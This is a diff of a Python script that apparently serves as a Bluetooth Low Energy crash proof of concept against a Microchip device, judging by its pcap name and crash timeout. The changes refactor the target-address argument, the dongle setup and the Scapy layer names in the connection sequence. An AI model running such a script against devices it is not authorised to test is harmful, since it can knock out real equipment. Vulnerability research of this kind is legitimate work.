@@ -27,24 +27,10 @@ slave_ever_connected = False
 # Autoreset colors
 colorama.init(autoreset=True)
 
-# Get serial port from command line
 if len(sys.argv) >= 2:
-    serial_port = sys.argv[1]
-elif platform.system() == 'Linux':
-    serial_port = '/dev/ttyACM0'
-elif platform.system() == 'Windows':
-    serial_port = 'COM1'
+    advertiser_address = sys.argv[1].upper()
 else:
-    print(Fore.RED + 'Platform not identified')
-    sys.exit(0)
-
-print(Fore.YELLOW + 'Serial port: ' + serial_port)
-
-# Get advertiser_address from command line (peripheral addr)
-if len(sys.argv) >= 3:
-    advertiser_address = sys.argv[2].upper()
-else:
-    advertiser_address = 'f8:f0:05:f3:66:e0'.upper()
+    advertiser_address = 'A4:C1:38:D8:AD:B8'
 
 print(Fore.YELLOW + 'Advertiser Address: ' + advertiser_address.upper())
 
@@ -70,7 +56,7 @@ def scan_timeout():
 
 
 # Open serial port of NRF52 Dongle
-driver = NRF52Dongle(serial_port, '115200', logs_pcap=True, pcap_filename='logs/Microchip_invalid_lcap_fragment.pcap')
+driver = NRF52Dongle(pcap_filename='logs/Microchip_invalid_lcap_fragment.pcap')
 # Send scan request
 scan_req = BTLE() / BTLE_ADV(RxAdd=slave_addr_type) / BTLE_SCAN_REQ(
     ScanA=master_address,
@@ -107,7 +93,7 @@ while True:
             print(Fore.MAGENTA + "RX <--- " + pkt.summary()[7:])
         # --------------- Process Link Layer Packets here ------------------------------------
         # Check if packet from advertised is received
-        if (BTLE_SCAN_RSP in pkt or BTLE_ADV in pkt) and pkt.AdvA == advertiser_address.lower() and connecting == False:
+        if (BTLE_SCAN_RSP in pkt or BTLE_ADV_IND in pkt) and pkt.AdvA == advertiser_address.lower() and connecting == False:
             connecting = True
             update_timeout('scan_timeout')
             update_timeout('crash_timeout')
@@ -139,13 +125,13 @@ while True:
             att_start_address = 0
             print(Fore.GREEN + 'Slave Connected (L2Cap channel established)')
             # 1) Send Feature request
-            pkt = BTLE(access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_FEATURE_REQ(
+            pkt = BTLE(access_addr=access_address) / BTLE_DATA() / BTLE_CTRL() / LL_FEATURE_REQ(
                 feature_set='le_encryption+le_data_len_ext')
             driver.send(pkt)
         # 2) Receive Feature response
         elif LL_FEATURE_RSP in pkt:
             # Send version indication request
-            pkt = BTLE(access_addr=access_address) / BTLE_DATA() / CtrlPDU() / LL_LENGTH_REQ(
+            pkt = BTLE(access_addr=access_address) / BTLE_DATA() / BTLE_CTRL() / LL_LENGTH_REQ(
                 max_tx_bytes=247 + 4, max_rx_bytes=247 + 4)
             driver.send(pkt)
 
@@ -158,7 +144,7 @@ while True:
 
         elif ATT_Exchange_MTU_Response in pkt:
             pkt = BTLE(access_addr=access_address) / \
-                  BTLE_DATA() / CtrlPDU() / LL_VERSION_IND(version='4.2')
+                  BTLE_DATA() / BTLE_CTRL() / LL_VERSION_IND(version='4.2')
             driver.send(pkt)
 
 
